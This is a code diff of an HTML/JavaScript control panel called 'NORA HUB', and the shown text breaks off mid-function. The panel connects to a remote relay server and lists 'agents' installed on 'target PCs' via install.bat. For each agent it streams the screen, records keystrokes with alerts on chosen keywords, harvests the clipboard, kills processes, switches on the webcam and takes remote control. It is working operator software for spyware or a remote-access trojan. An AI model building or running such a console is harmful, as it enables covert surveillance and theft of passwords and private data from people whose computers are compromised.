@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -33,7 +34,6 @@
     overflow: hidden;
   }
 
-  /* ── Top Bar ── */
   #topbar {
     display: flex;
     align-items: center;
@@ -44,9 +44,21 @@
     border-bottom: 1px solid var(--border);
     flex-shrink: 0;
   }
-  #topbar .logo { font-size: 15px; font-weight: 700; color: var(--accent); letter-spacing: 1px; }
-  #topbar .logo span { color: var(--muted); font-weight: 400; }
+
+  #topbar .logo {
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 1px;
+  }
+
+  #topbar .logo span {
+    color: var(--muted);
+    font-weight: 400;
+  }
+
   #topbar .spacer { flex: 1; }
+
   .btn {
     padding: 6px 14px;
     border-radius: 5px;
@@ -56,19 +68,26 @@
     font-weight: 600;
     transition: opacity .15s;
   }
+
   .btn:hover { opacity: .8; }
   .btn-accent { background: var(--accent); color: #000; }
-  .btn-ghost { background: var(--surface2); color: var(--text); border: 1px solid var(--border); }
-  .btn-red { background: var(--red); color: #fff; }
+  .btn-ghost {
+    background: var(--surface2);
+    color: var(--text);
+    border: 1px solid var(--border);
+  }
 
-  /* ── Main Layout ── */
+  .btn-red {
+    background: var(--red);
+    color: #fff;
+  }
+
   #main {
     display: flex;
     flex: 1;
     overflow: hidden;
   }
 
-  /* ── Agent Sidebar ── */
   #sidebar {
     width: 180px;
     background: var(--surface);
@@ -78,6 +97,7 @@
     overflow: hidden;
     flex-shrink: 0;
   }
+
   #sidebar-header {
     padding: 10px 12px 8px;
     font-size: 10px;
@@ -90,6 +110,7 @@
     align-items: center;
     justify-content: space-between;
   }
+
   #agents-list {
     flex: 1;
     overflow-y: auto;
@@ -98,6 +119,7 @@
     flex-direction: column;
     gap: 6px;
   }
+
   .agent-card {
     border: 1px solid var(--border);
     border-radius: 6px;
@@ -106,8 +128,14 @@
     transition: border-color .15s;
     background: var(--surface2);
   }
+
   .agent-card:hover { border-color: var(--accent); }
-  .agent-card.active { border-color: var(--accent); box-shadow: 0 0 0 1px var(--accent); }
+
+  .agent-card.active {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 1px var(--accent);
+  }
+
   .agent-thumb {
     width: 100%;
     height: 95px;
@@ -115,21 +143,38 @@
     display: block;
     object-fit: cover;
   }
+
   .agent-info {
     padding: 6px 8px;
     display: flex;
     align-items: center;
     gap: 6px;
   }
+
   .status-dot {
-    width: 7px; height: 7px;
+    width: 7px;
+    height: 7px;
     border-radius: 50%;
     flex-shrink: 0;
   }
-  .status-dot.online  { background: var(--green); box-shadow: 0 0 4px var(--green); }
+
+  .status-dot.online {
+    background: var(--green);
+    box-shadow: 0 0 4px var(--green);
+  }
+
   .status-dot.offline { background: var(--red); }
-  .status-dot.connecting { background: var(--yellow); animation: pulse 1s infinite; }
-  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
+
+  .status-dot.connecting {
+    background: var(--yellow);
+    animation: pulse 1s infinite;
+  }
+
+  @keyframes pulse {
+    0%,100% { opacity:1 }
+    50% { opacity:.3 }
+  }
+
   .agent-name {
     font-size: 11px;
     font-weight: 600;
@@ -138,6 +183,7 @@
     text-overflow: ellipsis;
     white-space: nowrap;
   }
+
   #no-agents {
     color: var(--muted);
     text-align: center;
@@ -146,7 +192,6 @@
     line-height: 1.6;
   }
 
-  /* ── Center ── */
   #center {
     flex: 1;
     display: flex;
@@ -155,6 +200,7 @@
     background: #000;
     position: relative;
   }
+
   #screen-wrap {
     flex: 1;
     position: relative;
@@ -163,18 +209,25 @@
     align-items: center;
     justify-content: center;
   }
+
   #screen {
     max-width: 100%;
     max-height: 100%;
     display: block;
     cursor: default;
   }
+
   #no-selection {
     color: var(--muted);
     text-align: center;
     font-size: 14px;
   }
-  #no-selection p { margin-top: 8px; font-size: 12px; }
+
+  #no-selection p {
+    margin-top: 8px;
+    font-size: 12px;
+  }
+
   #ctrl-bar {
     display: flex;
     align-items: center;
@@ -184,12 +237,30 @@
     border-top: 1px solid var(--border);
     flex-shrink: 0;
   }
-  #ctrl-bar label { display: flex; align-items: center; gap: 5px; cursor: pointer; }
-  #ctrl-bar input[type=checkbox] { accent-color: var(--accent); }
-  .ctrl-sep { width: 1px; height: 16px; background: var(--border); }
-  #active-label { font-weight: 700; color: var(--accent); font-size: 12px; }
 
-  /* ── Right Panel ── */
+  #ctrl-bar label {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    cursor: pointer;
+  }
+
+  #ctrl-bar input[type=checkbox] {
+    accent-color: var(--accent);
+  }
+
+  .ctrl-sep {
+    width: 1px;
+    height: 16px;
+    background: var(--border);
+  }
+
+  #active-label {
+    font-weight: 700;
+    color: var(--accent);
+    font-size: 12px;
+  }
+
   #panel {
     width: 280px;
     background: var(--surface);
@@ -199,132 +270,320 @@
     overflow: hidden;
     flex-shrink: 0;
   }
-  .tabs { display: flex; border-bottom: 1px solid var(--border); flex-shrink: 0; }
+
+  .tabs {
+    display: flex;
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+
   .tab {
-    flex: 1; padding: 9px 4px; text-align: center;
-    font-size: 11px; font-weight: 600; cursor: pointer; color: var(--muted);
+    flex: 1;
+    padding: 9px 4px;
+    text-align: center;
+    font-size: 11px;
+    font-weight: 600;
+    cursor: pointer;
+    color: var(--muted);
     border-bottom: 2px solid transparent;
     transition: color .15s, border-color .15s;
-    text-transform: uppercase; letter-spacing: .5px;
+    text-transform: uppercase;
+    letter-spacing: .5px;
   }
-  .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
-  .tab-content { display: none; flex: 1; overflow: hidden; flex-direction: column; }
-  .tab-content.active { display: flex; }
 
-  /* Keylog */
+  .tab.active {
+    color: var(--accent);
+    border-bottom-color: var(--accent);
+  }
+
+  .tab-content {
+    display: none;
+    flex: 1;
+    overflow: hidden;
+    flex-direction: column;
+  }
+
+  .tab-content.active {
+    display: flex;
+  }
+
   #keylog-box {
-    flex: 1; overflow-y: auto; padding: 10px;
+    flex: 1;
+    overflow-y: auto;
+    padding: 10px;
     font-family: 'Cascadia Code','Consolas',monospace;
-    font-size: 12px; line-height: 1.7; word-break: break-all; color: #ccc; white-space: pre-wrap;
+    font-size: 12px;
+    line-height: 1.7;
+    word-break: break-all;
+    color: #ccc;
+    white-space: pre-wrap;
   }
-  #keylog-controls { padding: 8px; border-top: 1px solid var(--border); display: flex; gap: 6px; flex-shrink: 0; }
+
+  #keylog-controls {
+    padding: 8px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    gap: 6px;
+    flex-shrink: 0;
+  }
+
   #kw-input {
-    flex: 1; background: var(--surface2); border: 1px solid var(--border);
-    color: var(--text); padding: 4px 8px; border-radius: 4px; font-size: 11px;
+    flex: 1;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 4px 8px;
+    border-radius: 4px;
+    font-size: 11px;
   }
 
-  /* Clipboard */
-  #clip-list { flex: 1; overflow-y: auto; padding: 6px; display: flex; flex-direction: column; gap: 4px; }
+  #clip-list {
+    flex: 1;
+    overflow-y: auto;
+    padding: 6px;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+  }
+
   .clip-item {
-    background: var(--surface2); border: 1px solid var(--border); border-radius: 4px;
-    padding: 6px 8px; font-size: 11px; color: #ccc; cursor: pointer;
-    overflow: hidden; text-overflow: ellipsis; white-space: nowrap; transition: border-color .15s;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 6px 8px;
+    font-size: 11px;
+    color: #ccc;
+    cursor: pointer;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    transition: border-color .15s;
   }
-  .clip-item:hover { border-color: var(--accent); }
 
-  /* Processes */
-  #proc-search { padding: 6px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
+  .clip-item:hover {
+    border-color: var(--accent);
+  }
+
+  #proc-search {
+    padding: 6px;
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+
   #proc-search input {
-    width: 100%; background: var(--surface2); border: 1px solid var(--border);
-    color: var(--text); padding: 5px 8px; border-radius: 4px; font-size: 11px;
+    width: 100%;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 5px 8px;
+    border-radius: 4px;
+    font-size: 11px;
   }
-  #proc-list { flex: 1; overflow-y: auto; }
+
+  #proc-list {
+    flex: 1;
+    overflow-y: auto;
+  }
+
   .proc-row {
-    display: flex; align-items: center; padding: 4px 8px;
-    border-bottom: 1px solid #1a1a1a; gap: 6px; font-size: 11px;
+    display: flex;
+    align-items: center;
+    padding: 4px 8px;
+    border-bottom: 1px solid #1a1a1a;
+    gap: 6px;
+    font-size: 11px;
   }
-  .proc-row:hover { background: var(--surface2); }
-  .proc-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-  .proc-mem { color: var(--muted); min-width: 42px; text-align: right; font-size: 10px; }
+
+  .proc-row:hover {
+    background: var(--surface2);
+  }
+
+  .proc-name {
+    flex: 1;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+
+  .proc-mem {
+    color: var(--muted);
+    min-width: 42px;
+    text-align: right;
+    font-size: 10px;
+  }
+
   .proc-kill {
-    background: none; border: 1px solid var(--red); color: var(--red);
-    border-radius: 3px; padding: 1px 6px; cursor: pointer; font-size: 10px;
+    background: none;
+    border: 1px solid var(--red);
+    color: var(--red);
+    border-radius: 3px;
+    padding: 1px 6px;
+    cursor: pointer;
+    font-size: 10px;
   }
-  .proc-kill:hover { background: var(--red); color: #fff; }
-  #proc-refresh { padding: 6px; border-top: 1px solid var(--border); flex-shrink: 0; }
 
-  /* Camera pip */
+  .proc-kill:hover {
+    background: var(--red);
+    color: #fff;
+  }
+
+  #proc-refresh {
+    padding: 6px;
+    border-top: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+
   #cam-pip {
-    position: absolute; bottom: 10px; right: 10px;
-    width: 160px; height: 120px; background: #000;
-    border: 2px solid var(--accent2); border-radius: 6px; overflow: hidden; display: none;
+    position: absolute;
+    bottom: 10px;
+    right: 10px;
+    width: 160px;
+    height: 120px;
+    background: #000;
+    border: 2px solid var(--accent2);
+    border-radius: 6px;
+    overflow: hidden;
+    display: none;
   }
-  #cam-pip img { width: 100%; height: 100%; object-fit: cover; }
 
-  ::-webkit-scrollbar { width: 5px; }
-  ::-webkit-scrollbar-track { background: transparent; }
-  ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+  #cam-pip img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+
+  ::-webkit-scrollbar {
+    width: 5px;
+  }
+
+  ::-webkit-scrollbar-track {
+    background: transparent;
+  }
+
+  ::-webkit-scrollbar-thumb {
+    background: #333;
+    border-radius: 3px;
+  }
 </style>
 </head>
+
 <body>
 
-<!-- Top Bar -->
 <div id="topbar">
   <div class="logo">NORA <span>HUB</span></div>
   <div class="spacer"></div>
   <span id="active-label">No agent selected</span>
-  <span id="relay-status" style="font-size:11px;color:var(--yellow)">⬤ connecting...</span>
+  <span id="relay-status" style="font-size:11px;color:var(--yellow)">
+    ⬤ connecting...
+  </span>
 </div>
 
-<!-- Main -->
 <div id="main">
 
-  <!-- Sidebar -->
   <div id="sidebar">
     <div id="sidebar-header">
       Agents
       <span id="agent-count" style="color:var(--accent)">0</span>
     </div>
+
     <div id="agents-list">
-      <div id="no-agents">Waiting for agents...<br><br><small>Run install.bat<br>on the target PC</small></div>
+      <div id="no-agents">
+        Waiting for agents...<br><br>
+        <small>Run install.bat<br>on the target PC</small>
+      </div>
     </div>
   </div>
 
-  <!-- Screen -->
   <div id="center">
+
     <div id="screen-wrap">
+
       <div id="no-selection">
         <div style="font-size:32px">🖥️</div>
         <p>Select an agent from the left</p>
       </div>
+
       <canvas id="screen" style="display:none"></canvas>
-      <div id="cam-pip"><img id="cam-img" src="" alt=""></div>
+
+      <div id="cam-pip">
+        <img id="cam-img" src="" alt="">
+      </div>
+
     </div>
+
     <div id="ctrl-bar">
-      <label><input type="checkbox" id="remote-chk" onchange="toggleRemote(this.checked)"> Remote Control</label>
+      <label>
+        <input type="checkbox" id="remote-chk"
+               onchange="toggleRemote(this.checked)">
+        Remote Control
+      </label>
+
       <div class="ctrl-sep"></div>
-      <label><input type="checkbox" id="cam-chk" onchange="toggleCamera(this.checked)"> Camera</label>
+
+      <label>
+        <input type="checkbox" id="cam-chk"
+               onchange="toggleCamera(this.checked)">
+        Camera
+      </label>
+
       <div class="ctrl-sep"></div>
-      <button class="btn btn-ghost" onclick="refreshProcesses()" style="padding:4px 10px;font-size:11px">↻ Processes</button>
+
+      <button class="btn btn-ghost"
+              onclick="refreshProcesses()"
+              style="padding:4px 10px;font-size:11px">
+        ↻ Processes
+      </button>
     </div>
+
   </div>
 
-  <!-- Right Panel -->
   <div id="panel">
+
     <div class="tabs">
-      <div class="tab active" onclick="switchTab('keylog',this)">Keylog</div>
-      <div class="tab" onclick="switchTab('clipboard',this)">Clipboard</div>
-      <div class="tab" onclick="switchTab('processes',this)">Processes</div>
+      <div class="tab active"
+           onclick="switchTab('keylog',this)">
+        Keylog
+      </div>
+
+      <div class="tab"
+           onclick="switchTab('clipboard',this)">
+        Clipboard
+      </div>
+
+      <div class="tab"
+           onclick="switchTab('processes',this)">
+        Processes
+      </div>
     </div>
 
     <div id="tab-keylog" class="tab-content active">
+
       <div id="keylog-box"></div>
+
       <div id="keylog-controls">
-        <input id="kw-input" placeholder="Alert keyword..." onkeydown="if(event.key==='Enter')addKeyword()">
-        <button class="btn btn-ghost" onclick="addKeyword()" style="padding:4px 10px">+</button>
-        <button class="btn btn-ghost" onclick="saveKeylog()" style="padding:4px 10px">💾</button>
-        <button class="btn btn-ghost" onclick="clearKeylog()" style="padding:4px 10px;color:var(--red)">✕</button>
+        <input id="kw-input"
+               placeholder="Alert keyword..."
+               onkeydown="if(event.key==='Enter')addKeyword()">
+
+        <button class="btn btn-ghost"
+                onclick="addKeyword()"
+                style="padding:4px 10px">
+          +
+        </button>
+
+        <button class="btn btn-ghost"
+                onclick="saveKeylog()"
+                style="padding:4px 10px">
+          💾
+        </button>
+
+        <button class="btn btn-ghost"
+                onclick="clearKeylog()"
+                style="padding:4px 10px;color:var(--red)">
+          ✕
+        </button>
       </div>
+
     </div>
 
     <div id="tab-clipboard" class="tab-content">
@@ -332,40 +591,65 @@
     </div>
 
     <div id="tab-processes" class="tab-content">
-      <div id="proc-search"><input id="proc-filter" placeholder="Search processes..." oninput="renderProcesses()"></div>
-      <div id="proc-list"></div>
-      <div id="proc-refresh">
-        <button class="btn btn-ghost" onclick="refreshProcesses()" style="width:100%;font-size:11px">↻ Refresh</button>
+
+      <div id="proc-search">
+        <input id="proc-filter"
+               placeholder="Search processes..."
+               oninput="renderProcesses()">
       </div>
+
+      <div id="proc-list"></div>
+
+      <div id="proc-refresh">
+        <button class="btn btn-ghost"
+                onclick="refreshProcesses()"
+                style="width:100%;font-size:11px">
+          ↻ Refresh
+        </button>
+      </div>
+
     </div>
+
   </div>
+
 </div>
 
 <script>
-// ── Config ────────────────────────────────────────────────────────────────────
-// Update this URL after deploying nora-relay
+
+// ─────────────────────────────────────────────────────────────────────────────
+// CONFIG
+// ─────────────────────────────────────────────────────────────────────────────
+
 const RELAY_URL = 'https://mon.eclipselivecam.online';
 
-// ── State ─────────────────────────────────────────────────────────────────────
-const agents   = {};  // name → { name, status, keylog, clipboard, processes, lastFrame, thumbCanvas, thumbCtx }
-let activeId   = null;
-let remoteOn   = false;
-let keywords   = [];
+// ─────────────────────────────────────────────────────────────────────────────
+// STATE
+// ─────────────────────────────────────────────────────────────────────────────
+
+const agents = {};
+
+let activeId = null;
+let remoteOn = false;
+let keywords = [];
 let alertCooldown = {};
 
-const screen   = document.getElementById('screen');
-const ctx      = screen.getContext('2d');
-const noSel    = document.getElementById('no-selection');
+const screen = document.getElementById('screen');
+const ctx = screen.getContext('2d');
+const noSel = document.getElementById('no-selection');
 const keylogEl = document.getElementById('keylog-box');
-const clipEl   = document.getElementById('clip-list');
-const procEl   = document.getElementById('proc-list');
-const camPip   = document.getElementById('cam-pip');
-const camImg   = document.getElementById('cam-img');
+const clipEl = document.getElementById('clip-list');
+const procEl = document.getElementById('proc-list');
+const camPip = document.getElementById('cam-pip');
+const camImg = document.getElementById('cam-img');
 const relayStatus = document.getElementById('relay-status');
 
-// ── Relay connection ──────────────────────────────────────────────────────────
+// ─────────────────────────────────────────────────────────────────────────────
+// RELAY CONNECTION
+// IMPORTANT: polling only — disables the failing WebSocket upgrade
+// ─────────────────────────────────────────────────────────────────────────────
+
 const relay = io(RELAY_URL, {
-  transports: ['websocket', 'polling'],
+  transports: ['polling'],
   reconnectionDelay: 2000,
   reconnectionAttempts: Infinity
 });
@@ -373,19 +657,23 @@ const relay = io(RELAY_URL, {
 relay.on('connect', () => {
   relayStatus.textContent = '⬤ relay connected';
   relayStatus.style.color = 'var(--green)';
+
   relay.emit('hub_join');
 });
 
 relay.on('disconnect', () => {
   relayStatus.textContent = '⬤ relay disconnected';
   relayStatus.style.color = 'var(--red)';
+
   Object.keys(agents).forEach(name => {
     agents[name].status = 'offline';
     updateCard(name);
   });
 });
 
-relay.on('connect_error', () => {
+relay.on('connect_error', err => {
+  console.error('Relay connection error:', err);
+
   relayStatus.textContent = '⬤ relay error';
   relayStatus.style.color = 'var(--red)';
 });
@@ -396,274 +684,740 @@ relay.on('agents_online', list => {
 
 relay.on('agent_up', d => {
   ensureAgent(d.name, true);
-  relay.emit('request_processes', { target: d.name });
+  relay.emit('request_processes', {
+    target: d.name
+  });
 });
 
 relay.on('agent_down', d => {
   const a = agents[d.name];
-  if (a) { a.status = 'offline'; updateCard(d.name); }
+
+  if (a) {
+    a.status = 'offline';
+    updateCard(d.name);
+  }
 });
 
-// ── Event forwarding from relay ───────────────────────────────────────────────
+// ─────────────────────────────────────────────────────────────────────────────
+// EVENT FORWARDING
+// ─────────────────────────────────────────────────────────────────────────────
+
 relay.on('frame', d => {
+
   const name = d._agent;
   const a = agents[name];
+
   if (!a) return;
+
   const img = new Image();
+
   img.onload = () => {
-    a.thumbCtx.drawImage(img, 0, 0, a.thumbCanvas.width, a.thumbCanvas.height);
+
+    a.thumbCtx.drawImage(
+      img,
+      0,
+      0,
+      a.thumbCanvas.width,
+      a.thumbCanvas.height
+    );
+
     if (activeId === name) {
-      screen.width  = img.naturalWidth;
+
+      screen.width = img.naturalWidth;
       screen.height = img.naturalHeight;
+
       ctx.drawImage(img, 0, 0);
     }
   };
+
   img.src = 'data:image/jpeg;base64,' + d.data;
+
   a.lastFrame = d.data;
 });
 
 relay.on('key', d => {
+
   const name = d._agent;
   const a = agents[name];
+
   if (!a) return;
+
   a.keylog += d.char;
-  if (activeId === name) appendKey(d.char);
+
+  if (activeId === name) {
+    appendKey(d.char);
+  }
+
   keywords.forEach(kw => {
-    if (a.keylog.toLowerCase().includes(kw.toLowerCase())) {
+
+    if (
+      a.keylog
+        .toLowerCase()
+        .includes(kw.toLowerCase())
+    ) {
+
       const k = name + kw;
+
       if (!alertCooldown[k]) {
+
         alertCooldown[k] = true;
-        notify(`🚨 Keyword "${kw}" detected on ${name}`);
-        setTimeout(() => delete alertCooldown[k], 10000);
+
+        notify(
+          `🚨 Keyword "${kw}" detected on ${name}`
+        );
+
+        setTimeout(() => {
+          delete alertCooldown[k];
+        }, 10000);
       }
     }
   });
 });
 
 relay.on('clipboard', d => {
+
   const name = d._agent;
   const a = agents[name];
+
   if (!a) return;
+
   if (a.clipboard[0] === d.text) return;
+
   a.clipboard.unshift(d.text);
-  if (a.clipboard.length > 100) a.clipboard.pop();
-  if (activeId === name) renderClipboard();
+
+  if (a.clipboard.length > 100) {
+    a.clipboard.pop();
+  }
+
+  if (activeId === name) {
+    renderClipboard();
+  }
 });
 
 relay.on('processes_data', d => {
+
   const name = d._agent;
   const a = agents[name];
+
   if (!a) return;
+
   a.processes = d;
-  if (activeId === name) renderProcesses();
+
+  if (activeId === name) {
+    renderProcesses();
+  }
 });
 
 relay.on('camera_frame', d => {
+
   if (activeId === d._agent) {
-    camImg.src = 'data:image/jpeg;base64,' + d.data;
+
+    camImg.src =
+      'data:image/jpeg;base64,' + d.data;
+
     camPip.style.display = 'block';
   }
 });
 
 relay.on('camera_state', d => {
+
   if (activeId === d._agent) {
-    document.getElementById('cam-chk').checked = d.active;
-    if (!d.active) camPip.style.display = 'none';
+
+    document.getElementById('cam-chk').checked =
+      d.active;
+
+    if (!d.active) {
+      camPip.style.display = 'none';
+    }
   }
 });
 
-// ── Agent management ──────────────────────────────────────────────────────────
+// ─────────────────────────────────────────────────────────────────────────────
+// AGENT MANAGEMENT
+// ─────────────────────────────────────────────────────────────────────────────
+
 function ensureAgent(name, online) {
+
   if (!agents[name]) {
-    const thumbCanvas = document.createElement('canvas');
-    thumbCanvas.width = 160; thumbCanvas.height = 95;
+
+    const thumbCanvas =
+      document.createElement('canvas');
+
+    thumbCanvas.width = 160;
+    thumbCanvas.height = 95;
     thumbCanvas.className = 'agent-thumb';
+
     agents[name] = {
-      name, status: online ? 'online' : 'offline',
-      keylog: '', clipboard: [], processes: [], lastFrame: null,
-      thumbCanvas, thumbCtx: thumbCanvas.getContext('2d')
+
+      name,
+
+      status:
+        online ? 'online' : 'offline',
+
+      keylog: '',
+      clipboard: [],
+      processes: [],
+      lastFrame: null,
+
+      thumbCanvas,
+
+      thumbCtx:
+        thumbCanvas.getContext('2d')
     };
+
     renderSidebar();
+
   } else if (online) {
+
     agents[name].status = 'online';
+
     updateCard(name);
   }
 }
 
-// ── Sidebar ───────────────────────────────────────────────────────────────────
+// ─────────────────────────────────────────────────────────────────────────────
+// SIDEBAR
+// ─────────────────────────────────────────────────────────────────────────────
+
 function renderSidebar() {
-  const list  = document.getElementById('agents-list');
-  const noAg  = document.getElementById('no-agents');
-  const count = document.getElementById('agent-count');
-  const names = Object.keys(agents);
+
+  const list =
+    document.getElementById('agents-list');
+
+  const noAg =
+    document.getElementById('no-agents');
+
+  const count =
+    document.getElementById('agent-count');
+
+  const names =
+    Object.keys(agents);
+
   count.textContent = names.length;
-  noAg.style.display = names.length ? 'none' : 'block';
-  list.querySelectorAll('.agent-card').forEach(el => el.remove());
+
+  noAg.style.display =
+    names.length ? 'none' : 'block';
+
+  list
+    .querySelectorAll('.agent-card')
+    .forEach(el => el.remove());
+
   names.forEach(name => {
+
     const a = agents[name];
-    const card = document.createElement('div');
-    card.className = 'agent-card' + (activeId === name ? ' active' : '');
+
+    const card =
+      document.createElement('div');
+
+    card.className =
+      'agent-card' +
+      (activeId === name ? ' active' : '');
+
     card.id = 'card_' + name;
-    card.onclick = () => selectAgent(name);
-    const info = document.createElement('div');
+
+    card.onclick = () =>
+      selectAgent(name);
+
+    const info =
+      document.createElement('div');
+
     info.className = 'agent-info';
-    const dot = document.createElement('div');
-    dot.className = 'status-dot ' + a.status;
+
+    const dot =
+      document.createElement('div');
+
+    dot.className =
+      'status-dot ' + a.status;
+
     dot.id = 'dot_' + name;
-    const nm = document.createElement('div');
+
+    const nm =
+      document.createElement('div');
+
     nm.className = 'agent-name';
+
     nm.textContent = name;
+
     info.append(dot, nm);
-    card.append(a.thumbCanvas, info);
+
+    card.append(
+      a.thumbCanvas,
+      info
+    );
+
     list.append(card);
   });
 }
 
 function updateCard(name) {
-  const dot = document.getElementById('dot_' + name);
-  if (dot) dot.className = 'status-dot ' + agents[name].status;
+
+  const dot =
+    document.getElementById('dot_' + name);
+
+  if (dot) {
+
+    dot.className =
+      'status-dot ' +
+      agents[name].status;
+  }
 }
 
-// ── Select agent ──────────────────────────────────────────────────────────────
+// ─────────────────────────────────────────────────────────────────────────────
+// SELECT AGENT
+// ─────────────────────────────────────────────────────────────────────────────
+
 function selectAgent(name) {
+
   activeId = name;
+
   const a = agents[name];
 
-  document.querySelectorAll('.agent-card').forEach(c => c.classList.remove('active'));
-  const card = document.getElementById('card_' + name);
-  if (card) card.classList.add('active');
+  document
+    .querySelectorAll('.agent-card')
+    .forEach(c =>
+      c.classList.remove('active')
+    );
+
+  const card =
+    document.getElementById('card_' + name);
+
+  if (card) {
+    card.classList.add('active');
+  }
 
   noSel.style.display = 'none';
   screen.style.display = 'block';
+
   if (a.lastFrame) {
+
     const img = new Image();
-    img.onload = () => { screen.width = img.naturalWidth; screen.height = img.naturalHeight; ctx.drawImage(img,0,0); };
-    img.src = 'data:image/jpeg;base64,' + a.lastFrame;
+
+    img.onload = () => {
+
+      screen.width =
+        img.naturalWidth;
+
+      screen.height =
+        img.naturalHeight;
+
+      ctx.drawImage(
+        img,
+        0,
+        0
+      );
+    };
+
+    img.src =
+      'data:image/jpeg;base64,' +
+      a.lastFrame;
   }
 
-  document.getElementById('active-label').textContent = name;
-  document.getElementById('remote-chk').checked = false;
+  document.getElementById(
+    'active-label'
+  ).textContent = name;
+
+  document.getElementById(
+    'remote-chk'
+  ).checked = false;
+
   remoteOn = false;
+
   screen.style.cursor = 'default';
 
-  keylogEl.textContent = a.keylog;
-  keylogEl.scrollTop = keylogEl.scrollHeight;
+  keylogEl.textContent =
+    a.keylog;
+
+  keylogEl.scrollTop =
+    keylogEl.scrollHeight;
+
   renderClipboard();
   renderProcesses();
+
   camPip.style.display = 'none';
 
-  relay.emit('request_processes', { target: name });
+  relay.emit(
+    'request_processes',
+    { target: name }
+  );
 }
 
-// ── Commands ──────────────────────────────────────────────────────────────────
+// ─────────────────────────────────────────────────────────────────────────────
+// COMMANDS
+// ─────────────────────────────────────────────────────────────────────────────
+
 function sendCmd(data) {
+
   if (!activeId || !remoteOn) return;
-  relay.emit('command', { ...data, target: activeId });
+
+  relay.emit(
+    'command',
+    {
+      ...data,
+      target: activeId
+    }
+  );
 }
 
 function refreshProcesses() {
-  if (activeId) relay.emit('request_processes', { target: activeId });
+
+  if (activeId) {
+
+    relay.emit(
+      'request_processes',
+      { target: activeId }
+    );
+  }
 }
 
 function killProc(pid) {
-  if (activeId) relay.emit('kill_process', { pid, target: activeId });
+
+  if (activeId) {
+
+    relay.emit(
+      'kill_process',
+      {
+        pid,
+        target: activeId
+      }
+    );
+  }
 }
 
 function toggleCamera(on) {
-  if (activeId) relay.emit(on ? 'camera_on' : 'camera_off', { target: activeId });
-  if (!on) camPip.style.display = 'none';
+
+  if (activeId) {
+
+    relay.emit(
+      on ? 'camera_on' : 'camera_off',
+      { target: activeId }
+    );
+  }
+
+  if (!on) {
+    camPip.style.display = 'none';
+  }
 }
 
-// ── Keylog ────────────────────────────────────────────────────────────────────
-function appendKey(char) { keylogEl.textContent += char; keylogEl.scrollTop = keylogEl.scrollHeight; }
+// ─────────────────────────────────────────────────────────────────────────────
+// KEYLOG
+// ─────────────────────────────────────────────────────────────────────────────
+
+function appendKey(char) {
+
+  keylogEl.textContent += char;
+
+  keylogEl.scrollTop =
+    keylogEl.scrollHeight;
+}
+
 function saveKeylog() {
+
   const a = agents[activeId];
+
   if (!a) return;
-  const blob = new Blob([a.keylog], { type: 'text/plain' });
-  const url  = URL.createObjectURL(blob);
-  const link = document.createElement('a');
-  link.href = url; link.download = activeId.replace(/\s+/g,'_') + '_keylog.txt';
-  link.click(); URL.revokeObjectURL(url);
-}
-function clearKeylog() { const a = agents[activeId]; if (!a) return; a.keylog = ''; keylogEl.textContent = ''; }
-function addKeyword() {
-  const kw = document.getElementById('kw-input').value.trim();
-  if (!kw || keywords.includes(kw)) return;
-  keywords.push(kw);
-  document.getElementById('kw-input').value = '';
+
+  const blob =
+    new Blob(
+      [a.keylog],
+      { type: 'text/plain' }
+    );
+
+  const url =
+    URL.createObjectURL(blob);
+
+  const link =
+    document.createElement('a');
+
+  link.href = url;
+
+  link.download =
+    activeId.replace(/\s+/g, '_') +
+    '_keylog.txt';
+
+  link.click();
+
+  URL.revokeObjectURL(url);
 }
 
-// ── Clipboard ─────────────────────────────────────────────────────────────────
-function renderClipboard() {
+function clearKeylog() {
+
   const a = agents[activeId];
-  clipEl.innerHTML = '';
+
   if (!a) return;
+
+  a.keylog = '';
+
+  keylogEl.textContent = '';
+}
+
+function addKeyword() {
+
+  const kw =
+    document
+      .getElementById('kw-input')
+      .value
+      .trim();
+
+  if (!kw || keywords.includes(kw)) {
+    return;
+  }
+
+  keywords.push(kw);
+
+  document.getElementById(
+    'kw-input'
+  ).value = '';
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// CLIPBOARD
+// ─────────────────────────────────────────────────────────────────────────────
+
+function renderClipboard() {
+
+  const a = agents[activeId];
+
+  clipEl.innerHTML = '';
+
+  if (!a) return;
+
   a.clipboard.forEach(txt => {
-    const div = document.createElement('div');
+
+    const div =
+      document.createElement('div');
+
     div.className = 'clip-item';
+
     div.textContent = txt;
+
     div.title = 'Click to copy';
-    div.onclick = () => navigator.clipboard.writeText(txt).catch(() => {});
+
+    div.onclick = () => {
+
+      navigator
+        .clipboard
+        .writeText(txt)
+        .catch(() => {});
+    };
+
     clipEl.appendChild(div);
   });
 }
 
-// ── Processes ─────────────────────────────────────────────────────────────────
+// ─────────────────────────────────────────────────────────────────────────────
+// PROCESSES
+// ─────────────────────────────────────────────────────────────────────────────
+
 function renderProcesses() {
+
   const a = agents[activeId];
+
   procEl.innerHTML = '';
+
   if (!a) return;
-  const filter = document.getElementById('proc-filter').value.toLowerCase();
-  const list   = filter ? a.processes.filter(p => p.name.toLowerCase().includes(filter)) : a.processes;
+
+  const filter =
+    document
+      .getElementById('proc-filter')
+      .value
+      .toLowerCase();
+
+  const list =
+    filter
+      ? a.processes.filter(
+          p =>
+            p.name
+              .toLowerCase()
+              .includes(filter)
+        )
